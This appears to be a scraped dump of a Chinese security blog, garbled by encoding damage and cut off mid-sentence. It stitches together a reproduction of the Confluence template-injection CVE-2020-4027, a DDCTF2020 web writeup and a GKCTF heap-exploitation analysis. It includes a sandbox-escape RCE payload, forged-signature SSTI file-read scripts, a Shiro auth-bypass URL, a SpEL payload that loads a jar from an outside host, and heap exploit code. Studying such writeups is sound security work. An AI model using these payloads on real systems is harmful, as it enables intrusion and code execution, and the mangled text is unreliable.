è°ƒè¯•å¯ä»¥å…ˆä»VelocityEngineçš„initæ–¹æ³•ä¸‹æ‰‹ã€‚åœ¨initä¸‹æ–­ç‚¹ï¼Œç„¶åé‡æ–°è¿è¡Œç½‘ç«™çš„å¯åŠ¨è„šæœ¬ï¼Œç”¨äºåˆå§‹åŒ–çš„Propertieså¯¹è±¡æœ‰å¾ˆå¤šçš„é…ç½®ï¼Œå…¶ä¸­runtime.introspector.uberspectæ˜¯ä¸æ²™ç®±ç›¸å…³çš„ä¸€ä¸ªé…ç½®ã€‚å…¶ä½¿ç”¨ConfluenceAnnotationBoxingUberspectç±»è¿›è¡Œé…ç½®ã€‚ è·Ÿè¿›ConfluenceAnnotationBoxingUberspectï¼Œæœ€ç»ˆæ‰¾åˆ°å®ƒçš„çˆ¶ç±»SecureUberspectorï¼Œæ˜¯Volecityçš„é»˜è®¤æ²™ç®±ã€‚ ç”¨å‰é¢çš„DemoåŠ ä¸Šruntime.introspector.uberspectå±æ€§ï¼Œä½¿ç”¨ä¹‹å‰æ¨¡æ¿æ³¨å…¥çš„payloadè¿›è¡Œæµ‹è¯•ï¼Œä¼šæŠ›å‡ºä¸€å¥å‘Šè­¦ã€‚ æœå¯»ä¸€ç•ªï¼Œå‘ç°æ˜¯åœ¨SecureIntrospectorImplçš„getMethodæ–¹æ³•è¾“å‡ºçš„æ—¥å¿—ã€‚è·Ÿè¿›åˆ°åŒä¸€ä¸ªç±»ä¸­çš„checkObjectExecutePermissionæ–¹æ³•ï¼ŒéªŒè¯å¯¹è±¡æ˜¯å¦åˆæ³•ã€‚å¸¸è§„æ¨¡æ¿æ³¨å…¥è·å–Classå®ä¾‹ï¼Œä¸€èˆ¬é€šè¿‡Stringç±»å‹çš„Classå®ä¾‹è°ƒç”¨forNameæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯java.lang.Classå·²ç»åœ¨é»‘åå•ç±»å†…ï¼Œæ‰€ä»¥è¿™ç§æ–¹å¼åœ¨è¿™é‡Œå°±æ— æ³•ä½¿ç”¨äº†ã€‚ å†å›å»çœ‹çœ‹CVEçš„æè¿°ï¼Œè¯´æ˜¯é€šè¿‡ä¸Šä¸‹æ–‡ç»•è¿‡æ²™ç®±ã€‚æ¥ä¸‹æ¥æ‰¾æ‰¾æœ‰å“ªäº›ä¸Šä¸‹æ–‡å±æ€§ï¼Œæˆ‘è¿™é‡Œåœ¨æ¨¡æ¿ä¸­æ‰§è¡ŒStringçš„codePointBeforeæ–¹æ³•å¹¶ä¸‹æ–­ç‚¹ã€‚é¡ºç€è°ƒç”¨æ ˆå¾€ä¸Šæ‰¾ï¼Œåœ¨GenericVelocityMacroçš„executeæ–¹æ³•é‡Œè°ƒç”¨äº†MacroUtilsçš„defaultVelocityContextæ–¹æ³•ã€‚ è·Ÿè¿›defaultVelocityContextæ–¹æ³•å¯ä»¥çœ‹åˆ°é»˜è®¤è®¾ç½®äº†reqã€resã€actionå’Œwebworkå››ä¸ªä¸Šä¸‹æ–‡å±æ€§ã€‚ 123456789101112public static Context createDefaultVelocityContext() { Context ctx = ConfluenceVelocityManager.getConfluenceVelocityContext(); HttpContext httpContext = new StaticHttpContext(); HttpServletRequest request = httpContext.getRequest(); HttpServletResponse response = httpContext.getResponse(); ctx.put(\"req\", request != null ? request : new ConfluenceMockServletRequest()); ctx.put(\"res\", response); Action action = getConfluenceActionSupport(); ctx.put(\"action\", action); ctx.put(\"webwork\", new VelocityWebWorkUtil(new WebWorkVelocityContext((OgnlValueStack)null), (OgnlValueStack)null, (HttpServletRequest)null, (HttpServletResponse)null)); return ctx;} å…¶ä¸­reqåšæœ€ç»ˆæ˜¯å®ç°ServletRequestæ¥å£çš„ï¼Œå…·æœ‰getServletContextæ–¹æ³•ï¼Œå¯è·å¾—Servletçš„ä¸Šä¸‹æ–‡ã€‚è€Œä¸Šä¸‹æ–‡ä¸­æœ‰attributeså±æ€§ï¼Œå…¶ä¸­åŒ…æ‹¬org.apache.tomcat.InstanceManagerçš„é”®å€¼å¯¹ï¼Œè¿™ä¸ªç±»ååœ¨Struts2çš„Pocä¸­çœ‹è¿‡ï¼Œå¯ä»¥é€šè¿‡newInstanceæ–¹æ³•newä¸€ä¸ªç»™å®šç±»åçš„å®ä¾‹ã€‚ ç„¶åå¯ä»¥é€šè¿‡ScriptEngineManageræˆ–å„ç§è¡¨è¾¾å¼è¯­è¨€æ‰§è¡Œå‘½ä»¤ã€‚å…¶å®è¿™ä¸ªæ¨¡æ¿æ³¨å…¥æœ¬è´¨ä¸Šæ˜¯æ¼æ´ä½œè€…@pwntesterçš„å¦ä¸€ä¸ªCVEæ¼æ´Remote Code Execution in Apache Velocityï¼Œè€Œä¸”ä½œè€…ä¹Ÿç»™å‡ºäº†POCå¦‚ä¸‹ã€‚ 1${req.getServletContext().getAttribute(&apos;org.apache.tomcat.InstanceManager&apos;).newInstance(&apos;javax.script.ScriptEngineManager&apos;).getEngineByName(&apos;js&apos;).eval(&quot;java.lang.Runtime.getRuntime().exec(&apos;touch /tmp/pwned&apos;)&quot;)} åœ¨è¿™ä¹‹å‰é‡åˆ°å¤§å‘äº†ï¼Œå®˜æ–¹è¯´å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬7.5.0ï¼Œæˆ‘è‡ªå·±æ­äº†ä¸ª7.5.0ç‰ˆæœ¬ï¼ŒåŒ…æ‹¬ä½¿ç”¨æµ‹è¯•ç«™ç‚¹ï¼Œç”¨ä¸Šé¢çš„payloadæ˜¯ä¼šç›´æ¥åŸæ ·è¾“å‡ºçš„ï¼Œä¹Ÿå°±æ˜¯è¢«æ²™ç®±æ‹¦æˆªäº†ã€‚è¿™ä¸€åº¦è®©æˆ‘ä»¥ä¸ºæ–¹å‘é”™äº†ï¼Œåæ¥æ¢ä¸ª7.4.4ç‰ˆæœ¬å°±æˆåŠŸäº†ï¼Œè¿™å°±å¾ˆæ— è¯­äº†ã€‚ åè®°æ°´è¿™ç¯‡æ–‡ç« çš„æ—¶é—´è·¨åº¦å¥½å¤§ï¼Œä»ä¹æœˆåº•åˆ°ç°åœºï¼Œè¿‡äº†ä¸ªå›½åº†äººéƒ½æ‡ˆæ€ äº†ã€‚æ„Ÿè§‰å†™å¾—æœ‰ç‚¹ä¹±ï¼Œæ–‡ä¸­è‹¥æœ‰é”™è¯¯çš„åœ°æ–¹ï¼Œæœ›å„ä½å¸ˆå‚…ä¸åæ–§æ­£ã€‚ å‚è€ƒhttps://securitylab.github.com/advisories/GHSL-2020-045-atlassian_confluence/ https://securitylab.github.com/advisories/GHSL-2020-048-apache-velocity/ https://twitter.com/XiaoC75068775/status/1309673425984610306 https://www.cnblogs.com/jinshiyill/p/5240906.html","link":"/2021/10/20/Confluenceæ¨¡æ¿æ³¨å…¥ï¼ˆCVE-2020-4027ï¼‰å¤ç°/"},{"title":"DDCTF2020 WEB writeup","text":"å‰è¨€DDCTFæ˜¯ä¸ªæŒºå¥½çš„æ¯”èµ›ï¼Œé¢˜ç›®è´¨é‡å¾ˆé«˜ï¼Œpyç¨‹åº¦å¾ˆä½ã€‚ä¸çŸ¥é“ä»Šå¹´ä¸ºä»€ä¹ˆè¿™ä¹ˆå°‘é˜Ÿä¼ç­¾åˆ°ï¼Œéš¾é“è·Ÿåˆ«çš„æ¯”èµ›æ’è½¦äº†ï¼Ÿ Webç­¾åˆ°é¢˜æ ¹æ®æç¤ºå¾—çŸ¥æœ‰æ¥ä¸ªapiã€‚ 12345678910111213141516171819202122232425 Interface documentation- login interface[-][Safet Reminder]The Private key cannot use request parameterRequestMethod | POSTURL | http://117.51.136.197/admin/loginParam | username str | pwd strResponsetoken str | auth(Certification information)- auth interfaceRequestMethod | POSTURL | http://117.51.136.197/admin/authParam | username str | pwd str | token strResponseurl str | client download link+------------------+ +----------------------+ +--------------------+| | | | | || +----------------&gt; +----------------&gt; || Client(Linux) | | Auth/Command | | minion || &lt;----------------+ +&lt;---------------+ || | | | | |+------------------+ +----------------------+ +--------------------+ è®¿é—®ç¬¬ä¸€ä¸ªapiï¼Œå¾—åˆ°ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œè§£ç å¾—çŸ¥æ˜¯jwt tokenã€‚ å°è¯•ä¸€è½®jwtçš„å¸¸è§„æ“ä½œï¼Œæœ€åç”¨jwtcrackçˆ†ç ´å‡ºäº†å¯†é’¥ï¼Œä¿®æ”¹payloadä¸­çš„userRoleä¸ºADMINæäº¤åˆ°ç¬¬äºŒä¸ªapiå¤„ã€‚ å¾—åˆ°äº†clientçš„ä¸‹è½½åœ°å€ã€‚ è¿è¡Œä¸‹clientï¼Œå‘ç°å¹¶æ²¡æœ‰ç”¨æˆ·äº¤äº’åŠŸèƒ½ï¼Œå‘½ä»¤éƒ½æ˜¯ç¡¬ç¼–ç åœ¨ç¨‹åºé‡Œã€‚ 12345678910111213141516171819202122232425262728293031â”Œâ”€[p1ay2win@parrot]â”€[~/Desktop/Tools/c-jwt-cracker-master]â””â”€â”€? $/tmp/client 2020/09/07 00:50:15 ____ _ ____ _ ____ _____ _____ ____ ____ ____ ____ / _ \\/ \\/ _ \\/ \\/ _\\/__ __\\/ / /_ \\/ _ \\/_ \\/ _ \\| | \\|| || | \\|| || / / \\ | __\\_____ / /| / \\| / /| / \\|| |_/|| || |_/|| || \\__ | | | | \\____\\/ /_| \\_/|/ /_| \\_/|\\____/\\_/\\____/\\_/\\____/ \\_/ \\_/ \\____/\\____/\\____/\\____/ 2020/09/07 00:50:15 +---------------------------------------------------+|Flag Path := /home/dc2-user/flag/flag.txt ||ç­¾åæ ¼å¼ := command|time_stamp |+---------------------------------------------------+2020/09/07 00:50:15 +------------------+ +----------------------+ +--------------------+| | | | | || +----------------&gt; +----------------&gt; || Client | | Auth/Command | | minion || &lt;----------------+ +&lt;---------------+ || | | | | |+------------------+ +----------------------+ +--------------------+2020/09/07 00:50:15 [*]Start ping master...2020/09/07 00:50:15 [-]http://117.51.136.197/server/health connect succuess2020/09/07 00:50:15 [*]Start send command to minions...2020/09/07 00:50:15 [+]get sign:Q4OkAWjsnkfxKiqMv5wuFRXjgS/gGEFalDPS5IfuGww=, command:&apos;DDCTF&apos;, time_stamp:15994110152020/09/07 00:50:15 [+]send command url http://117.51.136.197/server/command and response:{&quot;code&quot;:0,&quot;message&quot;:&quot;success&quot;,&quot;data&quot;:&quot;DDCTF&quot;} æŠ“åŒ…åˆ†æç¡®å®éƒ½æ˜¯httpçš„æµé‡ï¼Œå‚æ•°é€šè¿‡jsonæ ¼å¼ä¼ é€’ï¼Œè¿˜æœ‰ä¸ªsignatureå‚æ•°éªŒè¯å‘½ä»¤æœ‰æ²¡æœ‰è¢«ç¯¡æ”¹ã€‚ æœ¬æ¥æƒ³ç€é€šè¿‡IDAæ¥ä¿®æ”¹åŸå‘½ä»¤ï¼Œä½†æ˜¯åªèƒ½ä¿®æ”¹åˆ°é•¿åº¦ä¸º8çš„å‘½ä»¤ã€‚æœ€åé˜Ÿå‹é€šè¿‡æ¢å¤ç¬¦å·è¡¨å¾—çŸ¥ç­¾åæ˜¯å‘½ä»¤åŠ æ—¶é—´æˆ³çš„HMAC-sha256ï¼Œå¯†é’¥ä¸ºDDCTFWithYouã€‚ å†™äº†pyæµ‹è¯•ä¸‹å‘ç°ä¸ä¼šæ‰§è¡Œå‘½ä»¤ï¼Œä½†å­˜åœ¨SSTIã€‚ æ‰‹åŠ¨fuzzäº†ä¸‹ï¼Œå‘ç°æ‹¦æˆªäº†getClassã€forNameç­‰ç­‰ã€classLoaderæ²¡æ³•æ‰“å¼€urlã€execç›´æ¥çŠ¶æ€ç 500ï¼Œå¯èƒ½ç›´æ¥æŠŠRuntimeçš„åŒ…ç»™åˆ äº†ã€‚ ç°åœ¨å”¯æœ‰æ–‡ä»¶è¯»å–èƒ½ç”¨ï¼Œæœ€åç”¨åˆ°ä¸¤ä¸ªSSTIçš„payloadï¼Œä¸€ä¸ªè¯»ç›®å½•ï¼Œä¸€ä¸ªè¯»æ–‡ä»¶ï¼š 12(new java.io.File(\"/home/dc2-user/flag\")).list()T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get(\"/home/dc2-user/flag/flag.txt\")) EXP: 1234567891011121314151617181920212223242526import timeimport hmacimport base64import jsonimport sysimport requestsfrom hashlib import sha256appsecret = \"DDCTFWithYou\".encode('utf-8')# command = '(new java.io.File(\"/home/dc2-user/flag\")).list()'command = 'T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get(\"/home/dc2-user/flag/flag.txt\"))'timestamp = int(time.time())tmp = \"{}|{}\".format(command,timestamp).encode('utf-8')signature = base64.b64encode(hmac.new(appsecret, tmp, digestmod=sha256).digest())data = {}data['signature'] = signaturedata['command'] = commanddata['timestamp'] = timestampurl = 'http://117.51.136.197/server/command'headers = {'Content-Type': 'application/json'}r = requests.post(url=url,headers=headers,data = json.dumps(data))print(r.text) Easy Webå°è¯•ç™»å½•ä¸‹ï¼Œçœ‹åˆ°Response Headersåˆ©ç”¨rememberMe=deleteMeï¼Œå¾—çŸ¥åç«¯æœ‰Apache Shiroã€‚ Shiroååºåˆ—åŒ–ä¸€æŠŠæ¢­ï¼Œæ‰“äº†ä¸ªå¯‚å¯ï¼Œæ¯•ç«Ÿå“ªæœ‰è¿™ä¹ˆå®¹æ˜“ã€‚ä¼—æ‰€å‘¨çŸ¥åœ¨ctfé‡Œï¼š Easyä¸æ˜¯çœŸçš„easyï¼Œhardæ˜¯çœŸçš„hardã€‚ åœ¨é˜Ÿå‹æé†’ä¸‹å¾—çŸ¥æ˜¯CVE-2020-11989ï¼ŒShiroæƒé™ç»•è¿‡ã€‚ä¸€ä¸ªæ–œæ†åŠ åˆ†å·è¿›å…¥åˆ°åå°ã€‚ 1http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/index ä¸€çœ¼çœ‹åˆ°äº†ä»»æ„æ–‡ä»¶è¯»å–ï¼Œé™†é™†ç»­ç»­è¯»åˆ°äº†web.xmlã€springçš„é…ç½®æ–‡ä»¶å’Œé…ç½®æ–‡ä»¶é‡Œèƒ½çœ‹åˆ°çš„classã€‚ 1234567891011/WEB-INF/web.xml/WEB-INF/classes/com/ctf/util/SafeFilter.class/WEB-INF/classes/spring-core.xml/WEB-INF/classes/spring-web.xml/WEB-INF/classes/spring-shiro.xml/WEB-INF/classes/com/ctf/auth/FilterChainDefinitionMapBuilder.class/WEB-INF/classes/com/ctf/auth/ShiroRealm.class/WEB-INF/classes/com/ctf/model/User.class/WEB-INF/classes/com/ctf/model/Role.class/WEB-INF/classes/com/ctf/service/UserService.class/WEB-INF/classes/com/ctf/model/Permission.class æ³¨æ„åˆ°ä¸¤ç±»ï¼Œä¸€ä¸ªå‚æ•°çš„å€¼è¿‡æ»¤äº†ä¸€äº›javaçš„å…³é”®å­—ï¼Œå¦ä¸€ä¸ªè®°å½•äº†äº›é“¾æ¥ã€‚ æ‰“å¼€æœ€åä¸€ä¸ªé“¾æ¥ï¼Œä¸çŸ¥é“æ€ä¹ˆçš„å°±å˜æˆäº†adminç”¨æˆ·ï¼Œæä¾›äº†ä¸€ä¸ªè¾“å…¥æ¡†ã€‚ 1http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/ æµ‹è¯•ä¸‹å­˜åœ¨SpELæ³¨å…¥ï¼Œè¾“å…¥[[${7*7}]]æœ€åæ‰“å¼€çš„ç»“æœæ˜¯49ã€‚ å‚æ•°è¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—ï¼Œä½†æ²¡è¿‡æ»¤ClassLoaderå…³é”®å­—ï¼Œç”¨UrlClassLoaderè¯•ä¸‹å‘ç°å¯ä»¥è¿å¤–ç½‘ã€‚ 1new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(&quot;http://dnslog.cn/xxx.jar&quot;)}).loadClass(&quot;xxx&quot;).getConstructor().newInstance().toString() å½“ç„¶ï¼Œç”±äºè¿‡æ»¤äº†å¼•å·ï¼Œå­—ç¬¦ä¸²è¦ç”¨ä¸‹é¢çš„pyè„šæœ¬è½¬æ¢ä¸‹ã€‚ 123456payload = \"PUT PAYLOAD STRING HERE\"print (\"true.toString().charAt(0).toChars(%d)[0].toString()\" % ord(payload[0]), end='')for i in range(1, len(payload)): print (\".concat(true.toString().charAt(0).toChars(%d)[0].toString())\" % ord(payload[i]), end='')print (\"\") æŠŠç¼–è¯‘å¥½çš„classæ‰“åŒ…æˆjaræ‰”åˆ°vpsä¸Šï¼Œæœ¬æ¥æƒ³ç€ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯å‘½ä»¤å¹¶æ²¡æœ‰æ‰§è¡ŒæˆåŠŸï¼Œæœ‰æ—¶è¿˜ä¼šæŠ¥errorï¼Œæˆ‘è¿˜ä»¥ä¸ºæ˜¯ä»£ç çš„é—®é¢˜ï¼ŒæŠ˜è…¾äº†å¥½ä¹…ã€‚ æœ€åè¿˜æ˜¯ä»¥æ–‡ä»¶è¯»å–çš„æ–¹å¼è¯»flagã€‚ 1234567891011121314151617181920212223242526272829303132import java.io.*;import java.util.*;public class Cmd { String res; public Cmd(){ try { File dir = new File(\"/\"); String[] children = dir.list(); if (children == null) { } else { for (int i=0; i&lt; children.length; i++) { String filename = children[i]; res += filename+'\\n'; } } BufferedReader in = new BufferedReader(new FileReader(\"/flag_is_here\")); String str; while ((str = in.readLine()) != null) { res += str+'\\n'; } } catch (IOException e) { } } @Override public String toString() { return res; }} jaræ‰“åŒ…å‘½ä»¤å¦‚ä¸‹ 12javac .\\Cmd.javajar cvf Cmd.jar .\\Cmd.class å¯æƒœæœ€ååšå‡ºæ¥æ‰çŸ¥é“æ¯”èµ›æ—¶é—´å·²ç»è¿‡äº†ã€‚ã€‚ å‚è€ƒ Apache Shiroæƒé™ç»•è¿‡æ¼æ´åˆ†æ(CVE-2020-11989) éƒ½0202å¹´äº†è€å—¨è¿˜åœ¨ç”¨çš„ - å„ç§å§¿åŠ¿jsp webshell Exploiting SSTI in Thymeleaf EXPRESSION LANGUAGE INJECTION RCE - NO STRINGS ATTACHED","link":"/2020/09/07/DDCTF2020_WEB_writeup /"},{"title":"[PWN]GKCTF 2020 Domoåˆ†æ","text":"å‰è¨€è¿™é“é¢˜çœŸå¿ƒè§‰å¾—å‡ºå¾—ä¸é”™ï¼Œä¸€é“é¢˜å­¦åˆ°äº†å¾ˆå¤šæ–°çš„çŸ¥è¯†ã€‚ æ„Ÿè°¢å‡ºé¢˜äººstarssgoå¸ˆå‚…å’Œnocbtmå¸ˆå‚…çš„æ€è·¯å’Œwriteupï¼Œä¸‹é¢å°±æ¥è¯¦ç»†åˆ†æä¸€ä¸‹è§£é¢˜æ€è·¯å’Œå…¶ä¸­ç”¨åˆ°çš„è§£é¢˜æŠ€å·§ã€‚ å­˜åœ¨çš„æ¼æ´ off by null 1234567891011121314151617181920212223242526272829303132unsigned __int64 cmd_add(){ size_t nbyte; // [rsp+0h] [rbp-10h] unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); if ( (unsigned int)sub_C16() == 1 &amp;&amp; count &lt;= 8 ) { for ( HIDWORD(nbyte) = 0; SHIDWORD(nbyte) &lt;= 8; ++HIDWORD(nbyte) ) { if ( !ptr[SHIDWORD(nbyte)] ) { puts(\"size:\"); _isoc99_scanf(\"%d\", &amp;nbyte); if ( (nbyte &amp; 0x80000000) == 0LL &amp;&amp; (signed int)nbyte &lt;= 288 ) { ptr[SHIDWORD(nbyte)] = malloc((signed int)nbyte); puts(\"content:\"); read(0, ptr[SHIDWORD(nbyte)], (unsigned int)nbyte); *((_BYTE *)ptr[SHIDWORD(nbyte)] + (signed int)nbyte) = 0; ++count; } else { puts(\"sobig\"); } return __readfsqword(0x28u) ^ v2; } } } return __readfsqword(0x28u) ^ v2;} æ·»åŠ ç”¨æˆ·è¿™ä¸ªå‡½æ•°è¿™é‡Œï¼Œåœ¨è¾“å…¥å®Œå†…å®¹ä¹‹åï¼Œä¼šåŠ ä¸ª\\x00è¿›è¡Œæˆªæ–­ï¼Œç„¶è€ŒåŠ \\x00çš„ä½ç½®æ˜¯ä»–çš„sizeä½ç½®ï¼Œè¶…å‡ºäº†ä»–çš„ç©ºé—´å¤§å°ã€‚è¿™æ ·å°±èƒ½ä¿®æ”¹ä¸‹ä¸€ä¸ªchunkçš„szieï¼Œå®ç°æ”¹pre_inuseå’Œæ”¹å°ä¸‹ä¸€ä¸ªchunkçš„sizeã€‚ åˆå› ä¸ºæ˜¯sizeä½ç½®æ”¹æˆ\\x00ï¼Œè¾“å…¥çš„sizeç¨ä¸æ³¨æ„å°±ä¼šé”™æ”¹äº†ä»€ä¹ˆä¸œè¥¿-_-!ï¼Œè¿™éƒ½æ˜¯åè¯ã€‚ ä»»æ„åœ°å€å†™ 1234567891011121314151617181920212223242526272829unsigned __int64 __fastcall cmd_edit(_DWORD *a1, _DWORD *a2, _DWORD *a3){ _DWORD *v4; // [rsp+8h] [rbp-28h] void *buf; // [rsp+20h] [rbp-10h] unsigned __int64 v6; // [rsp+28h] [rbp-8h] v4 = a3; v6 = __readfsqword(0x28u); buf = 0LL; if ( (unsigned int)sub_C16() == 1 ) { if ( *a1 &amp;&amp; *a2 &amp;&amp; *v4 ) { puts(\"addr:\"); _isoc99_scanf(\"%ld\", &amp;buf); puts(\"num:\"); read(0, buf, 1uLL); *a1 = 0; *a2 = 0; *v4 = 0; puts(\"starssgo need ten girl friend \"); } else { puts(\"You no flag\"); } } return __readfsqword(0x28u) ^ v6;} è¿™é‡Œå¾ˆå®¹æ˜“å°±çœ‹å‡ºæ¥äº†ï¼Œè¾“å…¥ä»»æ„åœ°å€ï¼Œä¿®æ”¹æœ€åä¸€ä¸ªå­—èŠ‚ï¼Œä¸”åªæœ‰æ”¹ä¸€æ¬¡çš„æœºä¼šã€‚ åˆ©ç”¨è¿‡ç¨‹ä»¥ä¸‹ä»£ç å—é™¤äº†expå¤–ï¼Œindexéƒ½æ˜¯ä»£ç å—å†…ä»0ç®—èµ·çš„ç›¸å¯¹indexã€‚ 0x0 leak libc addresså’Œheap addresså¯¹äºlibc addressï¼Œè¦å…ˆåˆ›ä¸€ä¸ªsizeå¤§äº80ï¼Œæ—¢freeåä¼šè¿›å…¥unsorted binçš„chunkï¼Œå†åˆ›ä¸€ä¸ªchunkå«åº•ï¼Œé˜²æ­¢top chunkä¼šè·Ÿunsorted binåˆå¹¶ã€‚åˆ é™¤ç¬¬ä¸€ä¸ªchunkè¿›å…¥unsorted binï¼Œè¢«åˆ é™¤çš„chunkçš„fdå’Œbkå°±ä¼šæœ‰æŒ‡å‘main_arenaèŒƒå›´çš„åœ°å€ã€‚ 123cmd_add(0xf0,'')cmd_add(0x10,'')cmd_del(0) ç„¶åå†ç”³è¯·ä¸è¿™ä¸ªunsorted binchunkåŒæ ·å¤§å°çš„chunkï¼Œå†…å®¹è¾“å…¥ä¸ºç©ºï¼Œå› ä¸ºæˆ‘è¿™é‡Œç”¨çš„æ˜¯sendlineï¼Œæ¢è¡Œç¬¦\\x0aä¼šè¦†ç›–fdçš„æœ€åä¸€ä¸ªå­—èŠ‚ï¼Œè¿™é‡Œ\\x00å¯¹fdæ²¡å½±å“ã€‚ ç”¨showå‡½æ•°å°±èƒ½è¾“å‡ºmain_arenaçš„åœ°å€ï¼Œåˆå› ä¸ºmain_arenaçš„åœ°å€ç›¸å¯¹libcåœ°å€çš„åç§»æ˜¯ä¸€å®šçš„ï¼Œæ‰€ä»¥èƒ½å¤Ÿè®¡ç®—å‡ºlibcåœ°å€ã€‚å…·ä½“åç§»æ˜¯å¤šå°‘å¯ä»¥ç”¨gdbçš„vmmapå‘½ä»¤è®¡ç®—å‡ºæ¥ã€‚ 12cmd_add(0xf0,'')main_arena = u64(cmd_show(0).ljust(8,'\\x00')) + offset leak heap addressçš„æ€è·¯å·®ä¸å¤šï¼Œåˆ›ä¸¤ä¸ªåŒæ ·å°çš„chunkï¼Œå†éƒ½freeæ‰è¿›fastbinsã€‚ç¬¬äºŒä¸ªfreeçš„chunkçš„fdä¼šæŒ‡å‘ç¬¬ä¸€freeçš„chunkï¼Œç„¶åä¸€æ ·é‡æ–°ç”³è¯·ä¸€ä¸ªåŒæ ·å¤§å°çš„chunkï¼Œå†™å…¥å†…å®¹ç©ºï¼Œå†è¾“å‡ºã€‚ 12345cmd_add(0x10,'')cmd_add(0x10,'')cmd_del(0)cmd_add(0x10,'')main_arena = u64(cmd_show(0).ljust(8,'\\x00')) + offset è¿™é‡Œè¾“å…¥çš„sizeè¦è®¾è®¡å¾—å½“ï¼Œä¸ç„¶ä¸€ä¸å°å¿ƒå°±è¦†ç›–äº†åé¢chunkçš„sizeã€‚ç‰¹åˆ«åé¢fastbins attackæ—¶å€™ä¸å¯¹é½çš„fake chunkï¼Œæˆ‘åœ¨è¿™é‡Œè¸©äº†ä¸å°‘å‘ã€‚ 0x01 chunk overlapchunk overlapè¿™éƒ¨åˆ†æˆ‘ç”³è¯·ä¸‰ä¸ªchunkï¼Œè¾“å…¥çš„sizeåˆ†åˆ«æ˜¯0x40ã€0x68å’Œ0xf0ã€‚ç¬¬ä¸€ä¸ªchunkæ”¾fake chunkï¼Œç¬¬äºŒä¸ªchunkä¿®æ”¹fake chunkçš„next_sizeï¼Œå› ä¸ºç¬¬ä¸‰ä¸ªchunkçš„sizeæ˜¯0x101ï¼Œé¡ºä¾¿ç”¨off by nullä¿®æ”¹ç¬¬ä¸‰ä¸ªchunkçš„pre_inuseï¼Œè€Œç¬¬ä¸‰ä¸ªchunkçš„ä½œç”¨çº¯ç²¹æ˜¯å®ƒçš„pre_inuseè¢«ä¿®æ”¹åï¼Œæ ¹æ®å®ƒçš„pre_sizeå‘å‰unlinkã€‚ è¿˜æœ‰å°±æ˜¯fake chunké‚£ä¸ªè¦ä¼ªé€ ä¸‹fdå’ŒbkæŒ‡å‘è‡ªå·±ï¼Œå‰é¢æœ‰äº†head addrï¼Œåœ¨fake chunkçš„0x18å¤„æ”¾fake chunkçš„åœ°å€ï¼Œä»¤fake chunk-&gt;fd-&gt;bk=fake chunkä¸”fake chunk-&gt;bk-&gt;fd=fake chunkå°±OKã€‚ é¢˜ç›®çš„editå‡½æ•°éå¸¸è§„editï¼Œæƒ³ä¿®æ”¹chunkå¾—freeæ‰å†é‡æ–°ç”³è¯·ã€‚ 123456cmd_add(0x40,flat(0,0xb1,heap_addr+0x18,heap_addr+0x20,heap_addr+0x10))cmd_add(0x68,'')cmd_add(0xf0,'')cmd_del(1)cmd_add(0x68,flat('\\x00'*0x60,0xb0))cmd_del(2) freeç¬¬ä¸‰å—chunkå‰å †çš„æƒ…å†µï¼š freeç¬¬ä¸‰å—chunkåï¼Œå †æˆåŠŸé‡å ï¼š è¿™æ—¶å€™å°±å¯ä»¥æ§åˆ¶ç¬¬äºŒä¸ªchunkä¸ºæ‰€æ¬²ä¸ºã€‚ 0x02 fastbins attackç»è¿‡ä¸Šé¢çš„æ­¥éª¤ï¼Œå°†å †çš„æƒ…å†µç®€å•åŒ–ä¸€ä¸‹å°±æ˜¯è¿˜æœ‰ä¸€ä¸ªsizeä¸º0x50çš„chunkä¸”indexä¸º0ï¼Œä¸€ä¸ªsizeä¸º0x70çš„chunkä¸”indexä¸º1å’Œä¸€ä¸ªå¤§çš„unsorted binsã€‚ ä¸ºäº†å¥½æ“ä½œä¸€ç‚¹ï¼Œå…ˆç”³è¯·ä¸€ä¸ªchunkå ç€å‡†å¤‡ç”¨æ¥ä¿®æ”¹indexä¸º1çš„chunkï¼›ç„¶åç”³è¯·ä¸€ä¸ªsizeä¸º0x70çš„chunkï¼Œå¹¶ç«‹å³freeæ‰ï¼Œå†freeæ‰szieåŒä¸º0x70çš„indexä¸º1çš„chunkï¼›æœ€åï¼Œåˆ©ç”¨å ç€ä½çš„chunkä¿®æ”¹ç¬¬äºŒä¸ªfreeçš„0x70çš„chunkï¼ŒåŸæœ¬æŒ‡å‘ç¬¬ä¸€ä¸ªfreeçš„0x70çš„chunkçš„fdä¸ºæƒ³è¦ä»»æ„è¯»å†™çš„fake chunkçš„åœ°å€ã€‚ 123456cmd_add(0xc0,'') # index 2cmd_add(0x60,'') # index 3cmd_del(3)cmd_del(1)cmd_del(2)cmd_add(0xc0,flat('\\x00'*0x38,0x71,fake_chunk)) æ­¤æ—¶å †ä¸­çš„æƒ…å†µï¼š åˆ°è¿™é‡Œfastbins attackè¿˜æ²¡å®Œæˆï¼Œç”±äºæ€è·¯çš„ä¸åŒï¼Œåé¢çš„åˆ©ç”¨æ­¥éª¤ä¼šæœ‰æ‰€ä¸åŒã€‚å…ˆè¯´è¯´nocbtmå¸ˆå‚…çš„æ€è·¯ã€‚åœ¨_IO_2_1_stdin_æ—¢stdinæ–‡ä»¶æµç»“æ„ä½“çš„æŒ‡é’ˆé‡Œæœ‰ä¸ªvtableå˜é‡ã€‚ vtableå˜é‡çš„å€¼ä¸º_IO_file_jumpsçš„æŒ‡é’ˆï¼Œ_IO_file_jumpsä¸­ä¿å­˜äº†ä¸€äº›å‡½æ•°æŒ‡é’ˆï¼Œä¸€ç³»åˆ—æ ‡å‡†IOå‡½æ•°ä¸­ä¼šè°ƒç”¨è¿™äº›å‡½æ•°æŒ‡é’ˆï¼Œä½†_IO_file_jumpsé‡Œçš„å†…å®¹æ˜¯æ— æ³•ä¿®æ”¹çš„ï¼Œä½†å¯ä»¥ä¿®æ”¹vtableæŒ‡å‘ä¼ªé€ çš„_IO_file_jumpsä»è€Œgetshellã€‚ åœ¨_IO_2_1_stdin_ + 160 - 0x3åˆšå¥½èƒ½ä½œä¸ºfake 